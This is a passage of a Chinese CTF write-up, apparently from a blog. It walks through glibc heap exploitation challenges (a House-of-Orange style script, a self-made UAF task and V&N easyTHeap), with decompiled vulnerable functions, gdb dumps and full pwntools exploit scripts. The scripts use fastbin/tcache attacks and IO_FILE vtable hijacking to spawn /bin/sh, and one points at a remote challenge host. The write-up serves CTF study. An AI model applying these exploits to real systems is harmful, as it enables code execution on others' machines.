&#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;Your choice : &#x27;, str(1))\tsla(&#x27;name :&#x27;, str(size))\tsa(&#x27;Name :&#x27;, data)\tsla(&#x27;Price of Orange:&#x27;, str(16))\tsla(&#x27;Orange:&#x27;, &#x27;1&#x27;);def md(size, data):\tsla(&#x27;Your choice : &#x27;, str(3))\tsla(&#x27;name :&#x27;, str(size))\tsa(&#x27;Name:&#x27;, data)\tsla(&#x27;Price of Orange:&#x27;, str(16))\tsla(&#x27;Orange:&#x27;, &#x27;1&#x27;);def dp():\tsla(&#x27;Your choice : &#x27;, str(2))def q():\tsla(&#x27;:&#x27;, str(5))\t#--------------------------Exploit--------------------------def exploit():\tmain_arena = 0x3c4b20\t\tad(0x10, &#x27;A&#x27; * 0x10)\tp = &#x27;A&#x27; * 0x10\tp += p64(0) + p64(0x21)\tp += p64(0x1f00000010)\tp += p64(0)\tp += p64(0)\tp += p64(0x00fa1)\t# top chunk size 0x20fa1\t# top chunk addr 0x555555758060\t# alignment: 555555779001 -&gt; 0x1000\tli(&#x27;addr: &#x27; + hex(0xfa1 + 0x1000))\tmd(0x80, p)\tad(0x1000, &#x27;B&#x27; * 0x10)\t# leak libc base with overflow\tad(0x400, &#x27;C&#x27; * 0x8)\tdp()\tlib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - main_arena - 1640\tli(&#x27;libc_base &#x27; + hex(lib.address))\t# leak heap addr with large bin\tmd(0x10, &#x27;C&#x27; * 0x10)\tdp()\tru(&#x27;CCCCCCCCCCCCCCCC&#x27;)\theap = u64(ru(&#x27;\\x0a&#x27;).ljust(8, &#x27;\\x00&#x27;)) - 0xc0\tli(&#x27;heap &#x27; + hex(heap))\t_IO_list_all = lib.sym[&#x27;_IO_list_all&#x27;]\tli(&#x27;_IO_list_all &#x27; + hex(_IO_list_all))\t# Control program\tp = &#x27;B&#x27; * 0x400\tp += p64(0)\tp += p64(0x21)\tp += &#x27;B&#x27; * 0x10\t# fake file\tf = &#x27;/bin/sh\\x00&#x27; # flag overflow arg -&gt; system(&#x27;/bin/sh&#x27;)\tf += p64(0x61)    # _IO_read_ptr small bin size\t#  unsoted bin attack\tf += p64(0) # _IO_read_end)\tf += p64(_IO_list_all - 0x10)  # _IO_read_base\t#bypass check\t# fp-&gt;_IO_write_base &lt; fp-&gt;_IO_write_ptr\t# fp-&gt;mode &lt;=0 ((addr + 0xc8) &lt;= 0)\tf += p64(0) # _IO_write_base \tf += p64(1) # _IO_write_ptr\tf += p64(0) # _IO_write_end\tf += p64(0) # _IO_buf_base\tf += p64(0) # _IO_buf_end\tf += p64(0) # _IO_save_base\tf += p64(0) # _IO_backup_base\tf += p64(0) # _IO_save_end\tf += p64(0) # *_markers\tf += p64(0) # *_chain\tf += p32(0) # _fileno\tf += p32(0) # _flags2\tf += p64(1)  # _old_offset\tf += p16(2) # ushort _cur_colum;\tf += p8(3)  # char _vtable_offset\tf += p8(4)  # char _shrotbuf[1]\tf += p32(0) # null for alignment\tf += p64(0) # _offset\tf += p64(6) # _codecvt\tf += p64(0) # _wide_data\tf += p64(0) # _freeres_list\tf += p64(0) # _freeres_buf\tf += p64(0) # __pad5\tf += p32(0) # _mode\tf += p32(0) # _unused2\t#f = f.ljust(0xc0, &#x27;\\x00&#x27;)\tp += f\tp += p64(0) * 3 # alignment to vtable\tp += p64(heap + 0x5C8) # vtable\tp += p64(0) * 2\tp += p64(lib.sym[&#x27;system&#x27;]) # \tmd(0x600, p)\tdb()\tsl(&#x27;1&#x27;) #get shell\t# malloc(0x10) -&gt; malloc_printerr -&gt; overflow(IO_FILE addr) -&gt; system(&#x27;/bin/sh&#x27;)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\nUAF来源V&amp;N cnitlrt的面试,这是我自己按他要求出的题,然后自己打.\n难度5 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n简单描述只有添加和删除功能, 添加的时候输入大小,再输入内容, 而删除根据索引进行删除.\nvulunsigned __int64 del()&#123;  int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  v1 = 0;  puts(&quot;idx: &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  free(*((void **)&amp;pheap + 2 * v1)); //  UAF漏洞  puts(&quot;OK&quot;);  return __readfsqword(0x28u) ^ v2;&#125;\n\n\n\n知识点fastbin attack, IO_FILE\n思路开辟一个small bin, 然后通过fastbin attack partial write 修改unsoted bin 的 fd 的后两字节指向_IO_2_1_stderr + 157处, 使用fastbin attack_IO_2_1_stdout&#96;结构体中泄漏libc, 再次使用fastbin attack 打入malloc_hook - 0x23处打one_gadget, realloc的push次数调整execve第二个参数, 打通概率 1 &#x2F;16\n利用准备#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;pwn&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;2.del&#x27;, str(1))\tsla(&#x27;:&#x27;, str(size))\tsa(&#x27;:&#x27;, data)def rm(idx):\tsla(&#x27;2.del&#x27;, str(2))\tsla(&#x27;:&#x27;, str(idx))def q():\tsla(&#x27;:&#x27;, str(3))\t\t#--------------------------Exploit--------------------------def exploit():\ta = 0;\t#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\n堆布局ad(0x20, &#x27;A&#x27;) # idx 0 为了使用fastbin attack打入unsoted bin-0x10处p = &#x27;A&#x27; * 0x50   #伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fdp += p64(0) # prev_sizep += p64(0x31) # sizead(0x60, p) # idx 1ad(0x80, &#x27;B&#x27;) # idx 2 为了partiwritefast bin attack实现打入_IO_2_1_stderr + 157处ad(0x20, &#x27;A&#x27;) # idx 3 为了使用fastbin attack打入unsoted bin-0x10处ad(0x60, &#x27;A&#x27;) # idx 4 为了与修改后的chunk 2在fastbin中连接起来,然后就可以实现打入IO_2_1_stdout中# for fastbin attack to _free_hookad(0x60, &#x27;A&#x27;) # idx 5 为了fastbin attac 打入malloc_hook - 0x23ad(0x60, &#x27;A&#x27;) # idx 6 为了fastbin attac 打入malloc_hook - 0x23\n\n\n\n打入chunk 2修改size 和fdrm(3) # 为了 构造fastbin attackrm(0)rm(3)rm(2) # 先释放掉chunk 2,使fd 为main_arena + 0x58      # 这里采用partial write 方式修改 chunk 3中的fd指向 chunk 2 - 0x10处，这里是我们伪造好的堆块   ad(0x20, &#x27;\\x90&#x27;) # attack to chunk 2 - 0x10ad(0x20, &#x27;A&#x27;) # 调整ad(0x20, &#x27;A&#x27;) # 调整   # 修改chunk 2 的size和fdp = p64(0)p += p64(0x71)  # 修改为fastbin, 绕过检查p += &#x27;\\xdd\\x25&#x27; # partial write指向_IO_2_1_stderr + 157处ad(0x20, p) # patial write to _IO_2_1_stderr_ + 157   \n\n\n\n打入_IO_2_1_stderr + 157处满足size调试如下:\npwndbg&gt; x /40gx (long int)&amp;_IO_2_1_stdout_ - 0x430x7f007e1fe5dd &lt;_IO_2_1_stderr_+157&gt;:\t0x007e1fd660000000\t0x000000000000007f0x7f007e1fe5ed &lt;_IO_2_1_stderr_+173&gt;:\t0x0000000000000000\t0x00000000000000000x7f007e1fe5fd &lt;_IO_2_1_stderr_+189&gt;:\t0x0000000000000000\t0x00000000000000000x7f007e1fe60d &lt;_IO_2_1_stderr_+205&gt;:\t0x0000000000000000\t0x007e1fc6e00000000x7f007e1fe61d &lt;_IO_2_1_stderr_+221&gt;:\t0x00fbad288700007f\t0x007e1fe6a30000000x7f007e1fe62d &lt;_IO_2_1_stdout_+13&gt;:\t0x007e1fe6a300007f\t0x007e1fe6a300007f0x7f007e1fe63d &lt;_IO_2_1_stdout_+29&gt;:\t0x007e1fe6a300007f\t0x007e1fe6a300007f0x7f007e1fe64d &lt;_IO_2_1_stdout_+45&gt;:\t0x007e1fe6a300007f\t0x007e1fe6a300007f0x7f007e1fe65d &lt;_IO_2_1_stdout_+61&gt;:\t0x007e1fe6a400007f\t0x000000000000007f\n\n把刚才所构建的fastbin chunk 2放入fastbin 中\n# fastbin attack to _IO__2_1_stderr + 157   # 为了 构造fastbin attackrm(4)rm(1)rm(4)ad(0x60, &#x27;\\xa0&#x27;) # 将fastbin chunk 2放入fastbin 中# for alignmentad(0x60, &#x27;A&#x27;)ad(0x60, &#x27;A&#x27;)ad(0x60, &#x27;A&#x27;)\n\n\n\n泄漏libc修改_IO_2_1_stdout结构体实现打印出libc中的地址\np = &#x27;A&#x27; * 0x33   # _IO_2_1_stdout_ structp += p64(0xfbad3c80) # _IO_2_1_stdout_ flagp += p64(0) * 3p += p8(8)ad(0x60, p)lib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - (0x7ffff7dd2608 - 0x7ffff7a0d000)li(&#x27;libc_base &#x27; + hex(lib.address))\n\n\n\n打入__malloc_hook - 0x23处# fast bin attack to malloc_hook - 0x23   # 为了 构造fastbin attackrm(5)\trm(6)\trm(5)\tp = p64(lib.sym[&#x27;__malloc_hook&#x27;] - 0x23)ad(0x68, p)ad(0x68, &#x27;A&#x27;) # for ajustad(0x68, &#x27;A&#x27;) # for ajust\n\n\n\n修改malloc_hook 和realloc_hook打one_gadget通过realloc的push次数来调整execve的第二个参数\ngadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = lib.address + gadget[1]p = &#x27;A&#x27; * (0x13 -8)p += p64(one_gadget)p += p64(lib.sym[&#x27;realloc&#x27;] + 12)ad(0x68, p)\n\n\n\nget shell# get shellru(&#x27;del&#x27;)sl(&#x27;1&#x27;)\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;pwn&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;2.del&#x27;, str(1))\tsla(&#x27;:&#x27;, str(size))\tsa(&#x27;:&#x27;, data)def rm(idx):\tsla(&#x27;2.del&#x27;, str(2))\tsla(&#x27;:&#x27;, str(idx))def q():\tsla(&#x27;:&#x27;, str(3))\t#--------------------------Exploit--------------------------def exploit():\tad(0x20, &#x27;A&#x27;) # idx 0\tp = &#x27;A&#x27; * 0x50\tp += p64(0)\tp += p64(0x31)\tad(0x60, p) # idx 1\tad(0x80, &#x27;B&#x27;) # idx 2\tad(0x20, &#x27;A&#x27;) # idx 3\tad(0x60, &#x27;A&#x27;) # idx 4\t# for fastbin attack to _free_hook\tad(0x60, &#x27;A&#x27;) # idx 5\tad(0x60, &#x27;A&#x27;) # idx 6\trm(3)\trm(0)\trm(3)\trm(2) # for patial write to \tad(0x20, &#x27;\\x90&#x27;) # attack to chunk 2 - 0x10\tad(0x20, &#x27;A&#x27;)\tad(0x20, &#x27;A&#x27;)\tp = p64(0)\tp += p64(0x71)\tp += &#x27;\\xdd\\x25&#x27;\tad(0x20, p) # patial write to _IO_2_1_stderr_ + 157\t# fastbin attack to _IO__2_1_stderr + 157\trm(4)\trm(1)\trm(4)\tad(0x60, &#x27;\\xa0&#x27;)\t# for alignment\tad(0x60, &#x27;A&#x27;)\tad(0x60, &#x27;A&#x27;)\tad(0x60, &#x27;A&#x27;)\t\tp = &#x27;A&#x27; * 0x33\tp += p64(0xfbad3c80)\tp += p64(0) * 3\tp += p8(8)\tad(0x60, p)\tlib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - (0x7ffff7dd2608 - 0x7ffff7a0d000)\tli(&#x27;libc_base &#x27; + hex(lib.address))\t# fast bin attack to malloc_hook - 0x23\trm(5)\t\trm(6)\t\trm(5)\t\tp = p64(lib.sym[&#x27;__malloc_hook&#x27;] - 0x23)\tad(0x68, p)\tad(0x68, &#x27;A&#x27;) # for ajust\tad(0x68, &#x27;A&#x27;) # for ajust\tgadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]\tone_gadget = lib.address + gadget[1]\tp = &#x27;A&#x27; * (0x13 -8)\tp += p64(one_gadget)\tp += p64(lib.sym[&#x27;realloc&#x27;] + 12)\tad(0x68, p)\t# get shell\tru(&#x27;del&#x27;)\tsl(&#x27;1&#x27;)\t#db()def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()&#x27;&#x27;&#x27;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:[rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:[rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:[rsp+0x70] == NULL&#x27;&#x27;&#x27;\n\n\n\neasyTHeap来源v &amp; n\n难度4 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n简单描述该环境为glibc 2.27, 有teache机制.题中有五个功能,利用有限制,malloc只能7次以下, free 3次以下.\nvulint del()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = inputNum();  if ( v1 &lt; 0 || v1 &gt; 6 || !heap_array[v1] )    exit(0);  free((void *)heap_array[v1]);  size_array[v1] = 0;                           // not set ptr as null, can be double free  return puts(&quot;Done!&quot;);&#125;\n\n拥有uaf漏洞,可以使用teache机制double free任意地址分配.\n打法1评估: \n复杂度: 比较复杂  成功率: 低\n知识点tcache, IO_FILE\n思路程序中限制了malloc和free的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,实现任意地址分配.修改IO_2_1_stdout结构, 实现IO流对vtable的调用来触发one_gadget.\n利用准备#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;vn_pwn_easyTHeap&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 28200LOCAL = 0LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------# 这里由于直接查找_IO_str_jumps找不到,可以采取这样的办法查找_IO_str_jumps,也可以通过调试直接找.def get_IO_str_jumps_offset(): \tIO_file_jumps_offset = lib.sym[&#x27;_IO_file_jumps&#x27;]\tIO_str_underflow_offset = lib.sym[&#x27;_IO_str_underflow&#x27;]\tfor ref_offset in lib.search(p64(IO_str_underflow_offset)):\t\tpossible_IO_str_jumps_offset = ref_offset - 0x20\t\tif possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:\t\t\treturn possible_IO_str_jumps_offsetdef ad(size):\tsla(&#x27;choice: &#x27;, str(1))\tsla(&#x27;?&#x27;, str(size))def rm(idx):\tsla(&#x27;choice: &#x27;, str(4))\tsla(&#x27;?&#x27;, str(idx))def md(idx, data):\tsla(&#x27;choice: &#x27;, str(2))\tsla(&#x27;?&#x27;, str(idx))\tsla(&#x27;:&#x27;, data)def dp(idx):\tsla(&#x27;choice: &#x27;, str(3))\tsla(&#x27;?&#x27;, str(idx))def q():\tsla(&#x27;choice: &#x27;, str(5))\t\n\nleak heapad(0x100) #idx 0ad(0x100) #idx 1rm(0) # double free使fd指向自己,下次开辟可以通过修改fd实现任意地址分配rm(0)# leak heap addrdp(0) # 打印自己本身地址heap_base = u64(ru(&#x27;\\n&#x27;) + &#x27;\\x00\\x00&#x27;) - 0x260li(&#x27;heap_base &#x27; + hex(heap_base))   \n\nleak libc通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址, 那么怎样才能不满足呢,由于程序中最多只能分配7次,就不能使tcache bin的数量大于7了,那只能小于0,怎样才能小于0, 就采用tcache double free之后,就已经形成一个环,若没有修改fd,就一直在原地分配,分配成功后tcache bin的count - 1,当tcache bin的count小于0时,再次释放任何堆,就不会到tcache bin中了.\n# 一直开辟,直到count 小于0   ad(0x100) # 2 for ajustad(0x100) # 3   # 这里count 为-1,若开辟后释放,就不会到tcache bin中了ad(0x100) # 4rm(0)   # leak heap addrdp(0) # 当前的fd就是自己本身的地址,泄漏出heap地址heap_base = u64(ru(&#x27;\\n&#x27;) + &#x27;\\x00\\x00&#x27;) - 0x260li(&#x27;heap_base &#x27; + hex(heap_base))\n\n实现任意地址写入这里只需修改chunk 0的fd指向我们想要的地方,再次开辟,就会到我们想要修改的地方.\np = p64(_IO_2_1_stdout_) #修改chunk 0,(因为前几次分配都是重叠在一块chunk上的)的fd指向stdoutmd(3, p)ad(0x100) # idx 5 for ajustad(0x100) # idx 6, 开辟到stdout\n\n上面任意地址写入已经实现,如果改写malloc_hook或者free_hook,可以改写成功,但是没有办法触发.这是因为，已经用完了add功能的7次调用,delete功能的3次调用,因此,接下来,就调用不了malloc或free,也就无法触发了.因此,可以劫持_IO_2_1_stdout_的虚表.通过IO流对虚表的调用来触发one_gadget.由于glibc为2.29,因此不能直接伪造虚表,而应该将虚表劫持为_IO_str_jumps_附近\n0x00007f1fda7b1a65 &lt;+165&gt;:\tlea    rdx,[rip+0x366cf4]        # 0x7f1fdab18760 \t&lt;_IO_helper_jumps&gt;0x00007f1fda7b1a6c &lt;+172&gt;:\tlea    rax,[rip+0x367a55]        # 0x7f1fdab194c80x00007f1fda7b1a73 &lt;+179&gt;:\tsub    rax,rdx0x00007f1fda7b1a76 &lt;+182&gt;:\tmov    rcx,r130x00007f1fda7b1a79 &lt;+185&gt;:\tsub    rcx,rdx0x00007f1fda7b1a7c &lt;+188&gt;:\tcmp    rax,rcx0x00007f1fda7b1a7f &lt;+191&gt;:\tjbe    0x7f1fda7b1b40 &lt;_IO_puts+384&gt;0x00007f1fda7b1a85 &lt;+197&gt;:\tmov    rdx,rbx0x00007f1fda7b1a88 &lt;+200&gt;:\tmov    rsi,r120x00007f1fda7b1a8b &lt;+203&gt;:\tcall   QWORD PTR [r13+0x38] #调用虚表\n\n只需要让[r13+0x38]为IO_str_finish函数的指针即可,因此，需要将虚表修改为IO_str_jumps – XX,使得,r13+0x38正好对应上_IO_str_finish指针, 而IO_str_finish函数会call [IO_2_1_stdout + 0xE8]\ncall的前提是_IO_2_1_stdout_的flag的低1字节要为0. 综上,需要劫持_IO_2_1_stdout_结构体,修改flags,劫持虚表为IO_str_jumps – XX,修改_IO_2_1_stdout_+0xE8处为one_gadget.然后puts的调用即可触发one_gadget\n修改IO_2_1_stdout结构体p = p64(0xfbad2886) # 要覆盖flag的最低bit为0   #中间数据保持不变p += p64(_IO_2_1_stdout_ + 0x200) * 7p += p64(_IO_2_1_stdout_ + 0x201)p += p64(0) * 5p += p32(1) # file nump += p32(0)p += p64(0xffffffffffffffff)p += p64(0x000000000a000000)_IO_stdfile_1_lock = lib.address + (0x7ff3095508c0 - 0x7ff309163000)p += p64(_IO_stdfile_1_lock)p += p64(0xffffffffffffffff)p += p64(0)_IO_wide_data_1 = lib.address + (0x7f2fc336a8c0 - 0x7f2fc2f7f000)p += p64(_IO_wide_data_1)p += p64(0) * 3p += p64(0xffffffff)p = p.ljust(0xd8, &#x27;\\x00&#x27;)      #修改对应IO_str_finish函数指针,该函数会调用IO_2_1_stdout_+0xE8处的函数指针p += p64(vtable_jump)p += p64(0)p += p64(one_gadget) # IO_2_1_stdout_+0xE8处只需修改为one_gadgetmd(6, p)\n\nexp-1#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;vn_pwn_easyTHeap&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 28200LOCAL = 0LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def get_IO_str_jumps_offset():\tIO_file_jumps_offset = lib.sym[&#x27;_IO_file_jumps&#x27;]\tIO_str_underflow_offset = lib.sym[&#x27;_IO_str_underflow&#x27;]\tfor ref_offset in lib.search(p64(IO_str_underflow_offset)):\t\tli(&#x27;AA&#x27;)\t\tpossible_IO_str_jumps_offset = ref_offset - 0x20\t\tif possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:\t\t\treturn possible_IO_str_jumps_offsetdef ad(size):\tsla(&#x27;choice: &#x27;, str(1))\tsla(&#x27;?&#x27;, str(size))def rm(idx):\tsla(&#x27;choice: &#x27;, str(4))\tsla(&#x27;?&#x27;, str(idx))def md(idx, data):\tsla(&#x27;choice: &#x27;, str(2))\tsla(&#x27;?&#x27;, str(idx))\tsla(&#x27;:&#x27;, data)def dp(idx):\tsla(&#x27;choice: &#x27;, str(3))\tsla(&#x27;?&#x27;, str(idx))def q():\tsla(&#x27;choice: &#x27;, str(5))\t#--------------------------Exploit--------------------------def exploit():\tad(0x100) #idx 0\tad(0x100) #idx 1\trm(0)\trm(0)\t# leak heap addr\tdp(0)\theap_base = u64(ru(&#x27;\\n&#x27;) + &#x27;\\x00\\x00&#x27;) - 0x260\tli(&#x27;heap_base &#x27; + hex(heap_base))\tad(0x100) # 2 for ajust\tad(0x100) # 3\tad(0x100) # 4 teache count as -1, so free chunk will not be teache bin\trm(0)\t# leak libc\t_IO_str_jumps_offset = get_IO_str_jumps_offset()\tdp(0)\tlib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - 96 - 0x3ebc40\tli(&#x27;libc base &#x27; + hex(lib.address))\t_IO_str_jumps = lib.address + _IO_str_jumps_offset\t_IO_2_1_stdout_ = lib.sym[&#x27;_IO_2_1_stdout_&#x27;]\tli(&#x27;_IO_str_jumps &#x27; + hex(_IO_str_jumps))\tli(&#x27;_IO_2_1_stdout &#x27; + hex(_IO_2_1_stdout_))\tvtable_jump = _IO_str_jumps - 0x28\tgadget = [0x4f2c5, 0x4f322, 0x10a38c]\tone_gadget = lib.address + gadget[1]\t# can&#x27;t malloc only to modify _IO_2_1_stdout vtable\tp = p64(_IO_2_1_stdout_) # evil address\tmd(3, p)\tad(0x100) # idx 5 for ajust\tad(0x100) # idx 6, malloc to our addr\tp = p64(0xfbad2886)\tp += p64(_IO_2_1_stdout_ + 0x200) * 7\tp += p64(_IO_2_1_stdout_ + 0x201)\tp += p64(0) * 5\tp += p32(1) # file num\tp += p32(0)\tp += p64(0xffffffffffffffff)\tp += p64(0x000000000a000000)\t_IO_stdfile_1_lock = lib.address + (0x7ff3095508c0 - 0x7ff309163000)\tp += p64(_IO_stdfile_1_lock)\tp += p64(0xffffffffffffffff)\tp += p64(0)\t_IO_wide_data_1 = lib.address + (0x7f2fc336a8c0 - 0x7f2fc2f7f000)\tp += p64(_IO_wide_data_1)\tp += p64(0) * 3\tp += p64(0xffffffff)\tp = p.ljust(0xd8, &#x27;\\x00&#x27;)\tp += p64(vtable_jump)\tp += p64(0)\tp += p64(one_gadget)\tmd(6, p)\t#db()def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()&#x27;&#x27;&#x27;0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL&#x27;&#x27;&#x27;\n\n参考: https://blog.csdn.net/seaaseesa/article/details/105404106\n打法2评估: \n复杂度: 一般  成功率: 一般\n上面那个调用太复杂了,来个直接的\n知识点tcache, libc中的链接原理(与plt与got差不多)\n思路程序中限制了malloc和free的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,后面通过还有任意地址分配.将要调用的某个libc中的某个plt函数所对应的跳转地址中的值给改为one_gadget\n利用这个获取libc地址的打法与上面一样,就不写了, 主要是获得任意读写地址之后,怎样打one_gadget调用.这个打发就简单得多了,且高效,若所以one_gadget打不通,还可以换其他libc中plt函数来打,打通几率大大提升.\n通过调试, 发现在puts中存在一个plt,但是我打了全部one_gadget,就是参数不符合one_gadget,所以在printf中找到一个,如下.ABS*+0xa07f0@plt就是我们的目标了.\n  0x7f68f522141f 